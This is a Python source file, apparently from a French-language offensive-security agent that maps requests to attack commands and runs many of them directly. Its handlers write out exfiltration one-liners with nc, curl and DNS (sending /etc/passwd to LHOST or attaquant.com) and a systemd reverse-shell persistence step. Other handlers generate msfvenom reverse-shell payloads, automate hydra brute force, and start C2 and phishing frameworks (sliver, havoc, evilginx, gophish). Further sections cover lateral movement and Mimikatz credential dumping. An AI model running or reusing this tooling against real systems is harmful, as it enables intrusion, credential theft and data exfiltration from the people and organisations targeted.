                f"  Créer /etc/systemd/system/svc.service avec ExecStart reverse shell\n"
                f"  systemctl enable svc && systemctl start svc\n\n"
                f"Meterpreter — persistance :\n"
                f"  meterpreter> run persistence -X -i 60 -p {lport} -r {lhost or 'LHOST'}",
                {"level": 4})

        if any(kw in t for kw in ["latéral", "lateral", "crackmapexec", "psexec", "wmiexec"]):
            if not target:
                return self._result(False, "Spécifie la cible et les credentials.")
            return self._result(True,
                f"🧠 NIVEAU 4 — Mouvement latéral vers {target}\n\n"
                f"SMB (crackmapexec) :\n"
                f"  crackmapexec smb {target} -u user -p 'pass'\n"
                f"  crackmapexec smb {target} -u user -H <nthash>\n\n"
                f"PSExec (Impacket) :\n"
                f"  impacket-psexec domain/user:'pass'@{target}\n\n"
                f"WMIExec (sans fichiers) :\n"
                f"  impacket-wmiexec domain/user:'pass'@{target}\n\n"
                f"WinRM :\n"
                f"  evil-winrm -i {target} -u user -p 'pass'\n"
                f"  evil-winrm -i {target} -u user -H <nthash>",
                {"level": 4})

        if any(kw in t for kw in ["exfil", "exfiltration", "extraire données"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Exfiltration de données\n\n"
                "Via netcat (simple) :\n"
                f"  Récepteur : nc -lvnp {lport} > loot.tar.gz\n"
                f"  Victime   : tar czf - /données | nc {lhost or 'LHOST'} {lport}\n\n"
                "Via HTTP (discret) :\n"
                f"  curl -s -X POST http://{lhost or 'LHOST'}:{lport} -d @/etc/passwd\n\n"
                "Via DNS (très discret) :\n"
                "  base64 /etc/passwd | while read l; do dig $l.attaquant.com; done",
                {"level": 4})

        # ── C2 Frameworks — exécution réelle via c2_manager ──────────────────
        _c2_start_kw = {
            "sliver":   ["sliver démarrer", "sliver start", "lance sliver", "démarrer sliver", "start sliver"],
            "havoc":    ["havoc démarrer", "havoc start", "lance havoc", "démarrer havoc", "start havoc"],
            "gophish":  ["gophish démarrer", "gophish start", "lance gophish", "démarrer gophish", "start gophish"],
            "evilginx": ["evilginx démarrer", "evilginx start", "lance evilginx", "démarrer evilginx", "start evilginx"],
        }
        _c2_stop_kw = {
            "sliver":   ["sliver stop", "arrêter sliver", "arrête sliver", "stop sliver", "tuer sliver"],
            "havoc":    ["havoc stop", "arrêter havoc", "arrête havoc", "stop havoc", "tuer havoc"],
            "gophish":  ["gophish stop", "arrêter gophish", "arrête gophish", "stop gophish", "tuer gophish"],
            "evilginx": ["evilginx stop", "arrêter evilginx", "arrête evilginx", "stop evilginx", "tuer evilginx"],
        }
        _c2_logs_kw = {
            "sliver":   ["sliver logs", "sliver status", "sliver état"],
            "havoc":    ["havoc logs", "havoc status", "havoc état"],
            "gophish":  ["gophish logs", "gophish status", "gophish état"],
            "evilginx": ["evilginx logs", "evilginx status", "evilginx état"],
        }

        for c2_name, kws in _c2_start_kw.items():
            if any(kw in t for kw in kws):
                res = c2_manager.start(c2_name)
                if res["success"]:
                    status = c2_manager.status(c2_name)
                    msg = (f"✅ {c2_name.upper()} démarré — PID {res['pid']}\n"
                           f"Port : {status.get('port', 'N/A')}\n"
                           f"{status['description']}\n\n"
                           f"Logs en direct disponibles via : '{c2_name} logs'")
                else:
                    msg = f"❌ Échec démarrage {c2_name} : {res['error']}"
                return self._result(res["success"], msg, {"level": 4, "tool": c2_name, "action": "start"})

        for c2_name, kws in _c2_stop_kw.items():
            if any(kw in t for kw in kws):
                res = c2_manager.stop(c2_name)
                msg = f"✅ {c2_name.upper()} arrêté." if res["success"] else f"❌ {res['error']}"
                return self._result(res["success"], msg, {"level": 4, "tool": c2_name, "action": "stop"})

        for c2_name, kws in _c2_logs_kw.items():
            if any(kw in t for kw in kws):
                status = c2_manager.status(c2_name)
                logs = c2_manager.logs(c2_name, 30)
                state = "🟢 EN COURS" if status["running"] else "🔴 ARRÊTÉ"
                uptime = f" — uptime {status['uptime']}" if status.get("uptime") else ""
                lines = "\n".join(logs["lines"]) if logs["lines"] else "(aucun log)"
                msg = f"{c2_name.upper()} {state}{uptime}\n\n{lines}"
                return self._result(True, msg, {"level": 4, "tool": c2_name, "action": "logs"})

        # Status global C2
        if any(kw in t for kw in ["c2 status", "état c2", "c2 liste", "list c2", "tous les c2"]):
            all_c2 = c2_manager.list_all()
            lines = []
            for s in all_c2:
                icon = "🟢" if s["running"] else "🔴"
                uptime = f" (uptime: {s['uptime']})" if s.get("uptime") else ""
                lines.append(f"{icon} {s['name'].upper()}{uptime} — {s['description']}")
            return self._result(True, "🧠 C2 Frameworks :\n\n" + "\n".join(lines),
                                {"level": 4, "action": "status_all"})

        # Déclencheurs génériques (sans action = affiche guide + état)
        if any(kw in t for kw in ["sliver", "c2 sliver"]):
            s = c2_manager.status("sliver")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 C2 — Sliver [{state}]\n\n"
                "Commandes :\n"
                "  'sliver démarrer'  → lance le serveur\n"
                "  'sliver stop'      → arrête le serveur\n"
                "  'sliver logs'      → affiche les logs\n\n"
                f"Port MTLS : {s['port']} | PID : {s.get('pid', 'N/A')}",
                {"level": 4, "tool": "sliver"})

        if any(kw in t for kw in ["havoc", "c2 havoc"]):
            s = c2_manager.status("havoc")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 C2 — Havoc [{state}]\n\n"
                "Commandes :\n"
                "  'havoc démarrer'  → lance le teamserver\n"
                "  'havoc stop'      → arrête le serveur\n"
                "  'havoc logs'      → affiche les logs\n\n"
                f"Port Teamserver : {s['port']} | PID : {s.get('pid', 'N/A')}",
                {"level": 4, "tool": "havoc"})

        if any(kw in t for kw in ["mythic", "c2 mythic"]):
            return self._result(True,
                "🧠 C2 — Mythic (framework modulaire, Docker)\n\n"
                "Mythic nécessite Docker. Installation :\n"
                "  git clone https://github.com/its-a-feature/Mythic\n"
                "  cd Mythic && sudo ./install_docker_ubuntu.sh\n"
                "  sudo make && sudo ./mythic-cli start\n\n"
                "Accès : https://localhost:7443 (login mythic_admin)",
                {"level": 4, "tool": "mythic"})

        if any(kw in t for kw in ["meterpreter", "metasploit c2", "msf c2"]):
            lport_val = lport or "4444"
            return self._result(True,
                "🧠 C2 — Meterpreter (Metasploit)\n\n"
                "Listener :\n"
                f"  msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {lhost or 'LHOST'}; set LPORT {lport_val}; run'\n\n"
                "Commandes Meterpreter :\n"
                "  sysinfo ; getuid ; getsystem (privesc)\n"
                "  hashdump (SAM) ; run post/multi/recon/local_exploit_suggester\n"
                "  upload / download\n"
                "  portfwd add -l 8080 -p 80 -r victim\n"
                "  run post/multi/manage/shell_to_meterpreter\n"
                "  load kiwi ; creds_all (mimikatz)",
                {"level": 4, "tool": "meterpreter"})

        # ── Phishing ──────────────────────────────────────────────────────────
        if any(kw in t for kw in ["phishing", "fishing", "gophish", "campagne phishing"]):
            s = c2_manager.status("gophish")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 NIVEAU 4 — Gophish [{state}]\n\n"
                "Commandes :\n"
                "  'gophish démarrer'  → lance le serveur (UI port 3333)\n"
                "  'gophish stop'      → arrête le serveur\n"
                "  'gophish logs'      → affiche les logs\n\n"
                f"PID actuel : {s.get('pid', 'N/A')}\n\n"
                "Une fois démarré → http://localhost:3333 (admin/gophish)",
                {"level": 4, "tool": "gophish"})

        if any(kw in t for kw in ["evilginx", "mfa bypass", "adversary-in-the-middle"]):
            s = c2_manager.status("evilginx")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 NIVEAU 4 — Evilginx AiTM [{state}]\n\n"
                "Commandes :\n"
                "  'evilginx démarrer'  → lance le proxy (ports 443/80)\n"
                "  'evilginx stop'      → arrête le proxy\n"
                "  'evilginx logs'      → affiche les logs\n\n"
                f"PID actuel : {s.get('pid', 'N/A')}\n\n"
                "Phishlets disponibles : o365, gmail, linkedin, github, dropbox",
                {"level": 4, "tool": "evilginx"})

        # ── AD / Kerberos ─────────────────────────────────────────────────────
        if any(kw in t for kw in ["mimikatz", "credentials windows", "lsass dump"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Mimikatz (Credential Dump)\n\n"
                "Via Meterpreter (recommandé) :\n"
                "  meterpreter> load kiwi\n"
                "  meterpreter> creds_all\n"
                "  meterpreter> lsa_dump_secrets\n\n"
                "Via Wine (Linux) :\n"
                "  wine /usr/share/mimikatz/x64/mimikatz.exe\n\n"
                "Commandes clés :\n"
                "  sekurlsa::logonpasswords    (passwords en clair LSASS)\n"
                "  lsadump::sam               (hash SAM)\n"
                "  lsadump::lsa /patch         (hashes LSA)\n"
                "  sekurlsa::tickets /export   (tickets Kerberos)\n"
                "  kerberos::ptt ticket.kirbi  (Pass-the-Ticket)",
                {"level": 4, "tool": "mimikatz"})

        if any(kw in t for kw in ["rubeus", "kerberoast", "as-rep", "asrep", "pass-the-ticket", "kerberos attaque"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Rubeus (Attaques Kerberos)\n\n"
                "Kerberoasting (obtenir TGS crackables) :\n"
                "  Rubeus.exe kerberoast /outfile:hashes.txt\n"
                "  hashcat -m 13100 hashes.txt rockyou.txt\n\n"
                "AS-REP Roasting (pas de pré-auth) :\n"
                "  Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n"
                "  hashcat -m 18200 asrep.txt rockyou.txt\n\n"
                "Pass-the-Ticket :\n"
                "  Rubeus.exe ptt /ticket:base64encodedticket\n\n"
                "Dump tickets existants :\n"
                "  Rubeus.exe dump /service:krbtgt\n\n"
                "Note : Rubeus est un outil Windows — utiliser depuis une machine Windows\n"
                "Alternative Linux : impacket-GetUserSPNs (kerberoast), impacket-GetNPUsers (AS-REP)",
                {"level": 4, "tool": "rubeus"})

        if any(kw in t for kw in ["netexec", "nxc", "crackmapexec", "cme"]):
            target_str = target or "<subnet>"
            return self._result(True,
                f"🧠 NIVEAU 4 — NetExec (CrackMapExec v2)\n\n"
                f"Scan réseau Windows :\n"
                f"  netexec smb {target_str}/24 --gen-relay-list relays.txt\n\n"
                f"Authentification / password spray :\n"
                f"  netexec smb {target_str} -u users.txt -p passwords.txt --continue-on-success\n"
                f"  netexec smb {target_str} -u user -H <nthash>  (Pass-the-Hash)\n\n"
                f"Shares et informations :\n"
                f"  netexec smb {target_str} -u user -p 'pass' --shares\n"
                f"  netexec ldap {target_str} -u '' -p '' --users\n\n"
                f"Exécution de commandes :\n"
                f"  netexec winrm {target_str} -u admin -p 'pass' -x 'whoami'\n"
                f"  netexec smb {target_str} -u admin -p 'pass' -M mimikatz",
                {"level": 4, "tool": "netexec"})

        if any(kw in t for kw in ["shodan", "reconnaissance internet", "appareils exposés"]):
            query = re.sub(r"shodan\s*", "", task, flags=re.IGNORECASE).strip()
            if query and not any(kw in query.lower() for kw in ["guide", "aide", "help", "quoi"]):
                return self._run_command(f"shodan search '{query}'", task)
            return self._result(True,
                "🔍 Shodan — Moteur de recherche d'appareils exposés\n\n"
                "Commandes utiles :\n"
                "  shodan search 'apache country:FR'\n"
                "  shodan search 'default password'\n"
                "  shodan host <IP>           (infos sur une IP)\n"
                "  shodan count 'mongodb'\n"
                "  shodan stats --facets country,port 'nginx'\n\n"
                "Filtres puissants :\n"
                "  port:22 country:US org:'Amazon'\n"
                "  product:'IIS' version:'7.5'\n"
                "  vuln:CVE-2021-44228  (Log4Shell)\n\n"
                "Configuration : shodan init <API_KEY>",
                {"level": 1, "tool": "shodan"})

        lvl = offensive.get_level(4)
        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 4 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles ({len(lvl.tools)}) :\n{tools_list}\n\n"
            f"Domaines couverts :\n"
            f"  C2         → sliver | havoc | mythic | meterpreter\n"
            f"  Phishing   → gophish | evilginx | setoolkit\n"
            f"  AD/Kerberos→ mimikatz | rubeus | bloodhound | powerview\n"
            f"  Mouvement  → netexec | impacket | evil-winrm\n"
            f"  Pivot      → chisel | ligolo-ng | proxychains | sshuttle\n"
            f"  Persistance→ crontab | ssh keys | systemd | meterpreter\n"
            f"  Exfil      → nc | curl | dns",
            {"level": 4, "tools": [t.name for t in lvl.tools]})

    def _handle_pipeline(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        stages = {
            "fuzz": any(kw in t for kw in ["fuzz", "afl"]),
            "reverse": any(kw in t for kw in ["reverse", "analyser", "r2", "gdb"]),
            "exploit": any(kw in t for kw in ["exploit", "payload", "rop"]),
        }

        if binary and stages["fuzz"]:
            result = offensive.run_pipeline("fuzz", binary=binary, timeout=15)
            return self._result(True,
                f"Pipeline Fuzzing → Exploit sur {binary}\n\n"
                f"Étape 1/4 — FUZZING AFL++\n"
                f"  Crashs trouvés : {result.get('crashes_found', 0)}\n"
                f"  {result.get('result', '')[:300]}\n\n"
                f"Étape 2/4 — ANALYSE CRASH\n"
                f"  Commande : analyse_crash {binary} findings/default/crashes/id:000000*\n\n"
                f"Étape 3/4 — REVERSE ENGINEERING\n"
                f"  Commande : reverse {binary}\n\n"
                f"Étape 4/4 — EXPLOIT DEV\n"
                f"  Commande : exploit template {binary} offset 72",
                result)

        if binary and stages["reverse"]:
            result = offensive.run_pipeline("reverse", binary=binary)
            return self._result(result["success"],
                f"Analyse reverse de {binary} :\n\n"
                f"Protections :\n{result.get('checksec', '')}\n\n"
                f"Fonctions dangereuses : {result.get('dangerous_functions', [])}\n\n"
                f"Strings intéressantes : {result.get('interesting_strings', [])}\n\n"
                f"Gadgets ROP :\n{result.get('rop_gadgets_sample', '')[:800]}",
                result)

        return self._result(True,
            "Pipeline complet Fuzzing → Crash → Reverse → Exploit\n\n"
            "Étape 1 — FUZZING (trouver des crashs) :\n"
            "  mkdir corpus && echo 'test' > corpus/seed\n"
            "  afl-fuzz -i corpus/ -o findings/ -- ./binary @@\n\n"
            "Étape 2 — ANALYSE CRASH (exploitabilité) :\n"
            "  gdb -batch -ex 'run < crash' -ex 'bt full' ./binary\n"
            "  checksec --file=./binary\n\n"
            "Étape 3 — REVERSE (comprendre le bug) :\n"
            "  reverse ./binary          → analyse complète via L'Œil\n"
            "  r2 -A ./binary            → radare2\n\n"
            "Étape 4 — EXPLOIT DEV :\n"
            "  exploit template ./binary offset 72 LHOST 10.0.0.1\n\n"
            "Spécifie le binaire pour lancer le pipeline complet.\n"
            "Ex: fuzzer ./target | pipeline ./target",
            {"pipeline": ["fuzz", "analyse_crash", "reverse", "exploit_template"]})

    # ── Catégorie détection ───────────────────────────────────────────────────

    def _detect_category(self, task: str) -> Optional[str]:
        scores: dict[str, int] = {}
        for kw, cats in _ALL_KEYWORDS.items():
            if kw in task:
                for cat in cats:
                    scores[cat] = scores.get(cat, 0) + 1
        return max(scores, key=scores.get) if scores else None

    def _is_exploit_engine(self, t: str) -> bool:
        return any(kw in t for kw in [
            "cyclic", "cyclic_find", "checksec", "ropgadget", "ropper",
            "shellcode template", "xor encode", "exploit_summary", "analyse binaire",
            "offset finder", "find offset", "de bruijn",
        ])

    def _extract_direct_command(self, task: str) -> Optional[str]:
        """
        Si la tâche commence par un outil connu ET ressemble à une vraie commande
        shell (2ème token = flag '-' ou chemin '/' ou IP), la traite directement.
        Sinon, laisse les handlers catégorie interpréter le langage naturel.
        """
        parts = task.strip().split()
        if len(parts) < 2:
            return None
        tool = get_tool(parts[0].split("/")[-1])
        if not tool or tool.interactive:
            return None
        second = parts[1]
        # Reconnaître une vraie CLI : flag (-x), chemin (/tmp), IP (10.x), URL (http)
        is_cli = (
            second.startswith("-")
            or second.startswith("/")
            or second.startswith("http")
            or re.match(r"^\d{1,3}\.\d{1,3}", second)
        )
        return task.strip() if is_cli else None

    # ── Exécution générique ───────────────────────────────────────────────────

    def _run_command(self, command: str, original_task: str) -> dict:
        # Détecter le cwd depuis la tâche (ex: "dans /home/user/ctf")
        cwd = self._extract_cwd(original_task)
        result = terminal.run(command, cwd=cwd)

        if result.get("blocked"):
            return self._result(False, f"Bloqué : {result['error']}", {"command": command})

        if result["success"]:
            output = result["stdout"]
            if not output.strip():
                output = result.get("stderr", "") or "(aucune sortie)"
            return self._result(True, output, {"command": command, "returncode": result["returncode"]})

        err = result.get("stderr") or result.get("error", "Erreur inconnue")
        return self._result(False, f"Erreur (exit {result.get('returncode', -1)}):\n{err}",
                            {"command": command})

    def _extract_cwd(self, task: str) -> Optional[str]:
        m = re.search(r"(?:dans|in|cwd|répertoire|directory)\s+(/[\w/\-_.]+)", task)
        return m.group(1) if m else None

    # ── Handlers par catégorie ────────────────────────────────────────────────

    def _handle_recon(self, task: str) -> dict:
        t = task.lower()

        # Shodan — moteur de recherche d'appareils exposés
        if "shodan" in t:
            query = re.sub(r"\bshodan\b\s*", "", task, flags=re.IGNORECASE).strip()
            if query and not any(kw in query.lower() for kw in ["guide", "aide", "help", "scanner", "?"]):
                return self._run_command(f"shodan search '{query}'", task)
            return self._result(True,
                "🔍 Shodan — Moteur de recherche d'appareils exposés\n\n"
                "Commandes utiles :\n"
                "  shodan search 'apache country:FR'\n"
                "  shodan search 'default password'\n"
                "  shodan host <IP>           (infos sur une IP)\n"
                "  shodan count 'mongodb'\n"
                "  shodan stats --facets country,port 'nginx'\n\n"
                "Filtres puissants :\n"
                "  port:22 country:US org:'Amazon'\n"
                "  product:'IIS' version:'7.5'\n"
                "  vuln:CVE-2021-44228  (Log4Shell)\n\n"
                "Configuration : shodan init <API_KEY>",
                {"tool": "shodan"})

        target = self._extract_target(task)
        if not target:
            return self._result(True,
                "🔍 RECON — Spécifie une cible pour lancer le scan.\n\n"
                "Exemples :\n"
                "  scan 192.168.1.1          → nmap -sV -sC\n"
                "  scan 10.0.0.0/24          → découverte réseau\n"
                "  nmap -sV -p- 10.0.0.1     → commande directe\n"
                "  dns subdomain exemple.com  → énumération sous-domaines\n"
                "  arp-scan local            → scan réseau local\n\n"
                "Outils disponibles : nmap, masscan, rustscan, dnsrecon, amass, subfinder",
                {"hint": "Précise l'IP, domaine ou plage CIDR"})

        # Choisir l'outil selon le contexte
        if any(kw in task.lower() for kw in ["dns", "sous-domaine", "subdomain"]):
            cmd = f"dnsrecon -d {target}"
        elif any(kw in task.lower() for kw in ["amass", "passif", "passive"]):
            cmd = f"amass enum -d {target}"
        elif any(kw in task.lower() for kw in ["arp", "local", "réseau local"]):
            cmd = f"arp-scan -l"
        elif any(kw in task.lower() for kw in ["rapide", "fast", "quick"]):
            cmd = f"rustscan -a {target} -- -sV --open"
        elif any(kw in task.lower() for kw in ["tous les ports", "all ports", "-p-"]):
            cmd = f"nmap -sV -sC -p- --open -T4 {target}"
        elif any(kw in task.lower() for kw in ["vuln", "vulnérabilité"]):
            cmd = f"nmap --script vuln -p 80,443,8080,445,22 {target}"
        elif any(kw in task.lower() for kw in ["udp"]):
            cmd = f"nmap -sU --top-ports 100 {target}"
        else:
            cmd = f"nmap -sV -sC --open -T4 {target}"

        return self._run_command(cmd, task)

    def _handle_web(self, task: str) -> dict:
        t = task.lower()

        # Burp Suite
        if any(kw in t for kw in ["burp", "burpsuite"]):
            return self._result(True,
                "Burp Suite — proxy d'interception web :\n"
                "  burpsuite          (lancement GUI)\n\n"
                "Pour des scans automatiques en CLI, utiliser OWASP ZAP :\n"
                "  zaproxy -cmd -quickurl http://<cible> -quickout /tmp/zap.html\n\n"
                "API REST Burp (si activée sur port 1337) :\n"
                "  curl -s 'http://localhost:1337/v0.1/scan' \\\n"
                "       -d '{\"urls\":[\"http://<cible>\"]}'",
                {"tool": "burpsuite"})

        # OWASP ZAP
        if any(kw in t for kw in ["zap", "zaproxy", "owasp"]):
            target = self._extract_url_or_target(task)
            if target:
                if not target.startswith("http"):
                    target = f"http://{target}"
                cmd = f"zaproxy -cmd -quickurl {target} -quickout /tmp/zap_report.html"
                return self._run_command(cmd, task)
            return self._result(False, "Spécifie une URL. Ex: zaproxy http://10.0.0.1")

        target = self._extract_url_or_target(task)
        if not target:
            return self._result(True,
                "🌐 WEB — Spécifie une URL cible pour lancer le scan.\n\n"
                "Exemples :\n"
                "  gobuster http://10.0.0.1   → énumération répertoires\n"
                "  nikto http://10.0.0.1      → scan de vulnérabilités\n"
                "  sqlmap http://site/?id=1   → injection SQL\n"
                "  ffuf http://site/FUZZ      → fuzzing\n"
                "  whatweb http://site        → fingerprinting\n"
                "  wpscan http://site         → audit WordPress",
                {"hint": "Précise l'URL cible (http://...)"})

        if "sqlmap" in t:
            cmd = f"sqlmap -u '{target}' --dbs --batch"
        elif any(kw in t for kw in ["nikto", "vuln", "vulnérabilité"]):
            cmd = f"nikto -h {target}"
        elif any(kw in t for kw in ["ffuf", "fuzz", "param"]):
            wordlist = "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt"
            url = target if "FUZZ" in target else f"{target}/FUZZ"
            cmd = f"ffuf -w {wordlist} -u {url} -mc 200,301,302,403"
        elif any(kw in t for kw in ["wpscan", "wordpress", "wp"]):
            cmd = f"wpscan --url {target} --enumerate u,p,t"
        elif any(kw in t for kw in ["whatweb", "fingerprint", "technologie"]):
            cmd = f"whatweb -a 3 {target}"
        else:
            wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            cmd = f"gobuster dir -u {target} -w {wordlist} -t 50 -x php,html,txt,js"

        return self._run_command(cmd, task)

    # ── Wordlist par défaut (rockyou décompressé ou fallback) ─────────────────

    @staticmethod
    def _best_wordlist() -> str:
        for path in ["/tmp/rockyou.txt", "/usr/share/wordlists/rockyou.txt"]:
            if os.path.isfile(path):
                return path
        return "/usr/share/wordlists/fasttrack.txt"

    def _handle_passwords(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)
        wordlist = self._best_wordlist()

        if any(kw in t for kw in ["hashcat", "john", "hash", "crack"]):
            hash_match = re.search(r"\b([a-fA-F0-9]{32,})\b", task)
            if hash_match:
                hash_val = hash_match.group(1)
                hash_file = f"/tmp/hash_{hash_val[:8]}.txt"
                with open(hash_file, "w") as f:
                    f.write(hash_val + "\n")
                length = len(hash_val)
                # John the Ripper (CPU — fonctionne sans GPU)
                fmt_map = {32: "raw-md5", 40: "raw-sha1", 64: "raw-sha256", 128: "raw-sha512"}
                fmt = fmt_map.get(length, "raw-md5")
                if "hashcat" in t:
                    # Informe que hashcat nécessite GPU, propose john
                    mode = {32: "0", 40: "100", 64: "1400", 128: "1700"}.get(length, "0")
                    return self._result(True,
                        f"Hash détecté : {hash_val} (longueur {length} → mode {mode})\n\n"
                        f"hashcat (requiert GPU) :\n"
                        f"  hashcat -m {mode} -a 0 {hash_file} {wordlist} --force\n\n"
                        f"john (CPU, lance maintenant) :\n"
                        f"  john {hash_file} --format={fmt} --wordlist={wordlist}\n\n"
                        f"Lancement john...",
                        {"hash": hash_val, "hash_file": hash_file})
                cmd = f"john {hash_file} --format={fmt} --wordlist={wordlist}"
            elif self._extract_file_path(task):
                file_path = self._extract_file_path(task)
                cmd = f"john {file_path} --wordlist={wordlist}"
            else:
                return self._result(True,
                    "🔑 CRACK — Fournis le hash à cracker.\n\n"
                    "Exemples :\n"
                    "  crack 5f4dcc3b5aa765d61d8327deb882cf99   (MD5)\n"
                    "  john hash.txt                            (fichier)\n"
                    "  hashcat <hash>                           (GPU)")
        elif any(kw in t for kw in ["john"]):
            file_path = self._extract_file_path(task)
            if not file_path:
                return self._result(False,
                    "john nécessite un fichier de hashes.\n"
                    f"Ex: john hash.txt --wordlist={wordlist}")
            cmd = f"john {file_path} --wordlist={wordlist}"
        elif any(kw in t for kw in ["crackmapexec", "cme"]):
            if not target:
                return self._result(False, "Spécifie une cible pour crackmapexec.")
            cmd = f"crackmapexec smb {target} -u users.txt -p passwords.txt"
        elif any(kw in t for kw in ["kerbrute", "kerberos"]):
            if not target:
                return self._result(False, "Spécifie le DC pour kerbrute.")
            cmd = f"kerbrute userenum --dc {target} -d domain.local /usr/share/seclists/Usernames/Names/names.txt"
        elif any(kw in t for kw in ["hydra"]):
            if not target:
                return self._result(False, "Spécifie une cible pour hydra.")
            if any(kw in t for kw in ["ftp"]):
                cmd = f"hydra -l admin -P {wordlist} ftp://{target}"
            elif any(kw in t for kw in ["http", "web", "login"]):
                cmd = f"hydra -l admin -P {wordlist} {target} http-get /"
            elif any(kw in t for kw in ["rdp"]):
                cmd = f"hydra -l administrator -P {wordlist} rdp://{target}"
            elif any(kw in t for kw in ["smb"]):
                cmd = f"hydra -l administrator -P {wordlist} smb://{target}"
            else:
                cmd = f"hydra -l root -P {wordlist} ssh://{target}"
        else:
            return self._result(True,
                "🔑 PASSWORDS — Précise l'outil et la cible.\n\n"
                "Exemples :\n"
                "  hydra ssh://10.0.0.1         → brute-force SSH\n"
                "  crack <hash_md5>             → cracker un hash\n"
                "  john hash.txt                → john the ripper\n"
                "  crackmapexec 10.0.0.1        → spray SMB\n"
                "  kerbrute 10.0.0.1            → enum Kerberos")

        return self._run_command(cmd, task)

    def _handle_exploitation(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # Metasploit Framework — mode non-interactif
        if any(kw in t for kw in ["metasploit", "msfconsole", "msf"]) and "msfvenom" not in t:
            module_match = re.search(r"(exploit/[\w/]+|auxiliary/[\w/]+|post/[\w/]+)", task)
            lhost = self._extract_ip(task) or "10.10.10.10"
            lport = self._extract_port(task) or "4444"
            rhosts = target or "10.0.0.1"

            if module_match:
                module = module_match.group(1)
                msf_cmds = f"use {module}; set RHOSTS {rhosts}; set LHOST {lhost}; set LPORT {lport}; run; exit"
                cmd = f"msfconsole -q -x '{msf_cmds}'"
                return self._run_command(cmd, task)

            # Listener reverse shell
            if any(kw in t for kw in ["listener", "handler", "écoute", "reverse"]):
                payload = "windows/x64/meterpreter/reverse_tcp" if any(kw in t for kw in ["windows", "win"]) else "linux/x64/shell_reverse_tcp"
                msf_cmds = f"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run; exit"
                cmd = f"msfconsole -q -x '{msf_cmds}'"
                return self._run_command(cmd, task)

            return self._result(True,
                "Metasploit Framework — utilisation non-interactive :\n\n"
                "  msfconsole -q -x 'use <MODULE>; set RHOSTS <IP>; set LHOST <IP>; run; exit'\n\n"
                "Modules courants :\n"
                "  exploit/multi/handler                      → Listener (reverse shell)\n"
                "  exploit/windows/smb/ms17_010_eternalblue   → EternalBlue (MS17-010)\n"
                "  exploit/unix/ftp/vsftpd_234_backdoor       → vsFTPd 2.3.4\n"
                "  exploit/multi/samba/usermap_script         → Samba usermap\n"
                "  auxiliary/scanner/smb/smb_version          → Scan version SMB\n"
                "  auxiliary/scanner/ssh/ssh_login            → Brute force SSH\n"
                "  auxiliary/scanner/portscan/tcp             → Scan de ports\n"
                "  post/multi/recon/local_exploit_suggester   → Suggérer privesc\n\n"
                "Précise le module ou l'action pour lancer directement.",
                {"tool": "msfconsole"})

        if "msfvenom" in t or "payload" in t:
            lhost = self._extract_ip(task) or "10.10.10.10"
            lport = self._extract_port(task) or "4444"
            if any(kw in t for kw in ["windows", "win", "exe"]):
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/shell.exe"
            elif any(kw in t for kw in ["php"]):
                cmd = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php"
            elif any(kw in t for kw in ["python", "py"]):
                cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f py -b '\\x00'"
            elif any(kw in t for kw in ["aspx", "asp", "iis"]):
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o /tmp/shell.aspx"
            elif any(kw in t for kw in ["jar", "java"]):
                cmd = f"msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f jar -o /tmp/shell.jar"
            else:
                cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell"
            return self._run_command(cmd, task)

        if "searchsploit" in t:
            term = re.sub(r"searchsploit\s*", "", task, flags=re.IGNORECASE).strip()
            if not term:
                return self._result(False, "Spécifie le terme de recherche. Ex: searchsploit apache 2.4")
            return self._run_command(f"searchsploit {term}", task)

        if any(kw in t for kw in ["impacket", "secretsdump"]):
            return self._result(False,
                "Pour impacket, fournis la commande complète.\n"
                "Ex: impacket-secretsdump domain/user:pass@target\n"
                "Ex: impacket-psexec domain/user:pass@target")

        return self._result(True,
            "💥 EXPLOITATION — Précise l'action.\n\n"
            "Exemples :\n"
            "  metasploit listener 10.0.0.1 4444   → handler reverse shell\n"
            "  msfvenom linux 10.0.0.1 4444        → payload ELF\n"
            "  searchsploit apache 2.4             → chercher CVE\n"
            "  impacket-psexec dom/user:pass@IP    → PSExec")

    def _handle_reversing(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["checksec", "protections", "mitigations", "pie", "nx", "canary"]):
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: checksec ./challenge")
            result = checksec(binary)
            return self._result(True, self._format_checksec(result), {"checksec": result})

        if any(kw in t for kw in ["rop", "gadget", "gadgets"]):
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: rop gadgets ./challenge | gadgets pop rdi ./binary")
            search_term = None
            m = re.search(r"(?:search|grep|cherch\w*)\s+['\"]?(.+?)['\"]?\s*$", t)
            if m:
                search_term = m.group(1)
            result = rop_gadgets(binary, search=search_term)
            if "error" in result:
                return self._result(False, result["error"])
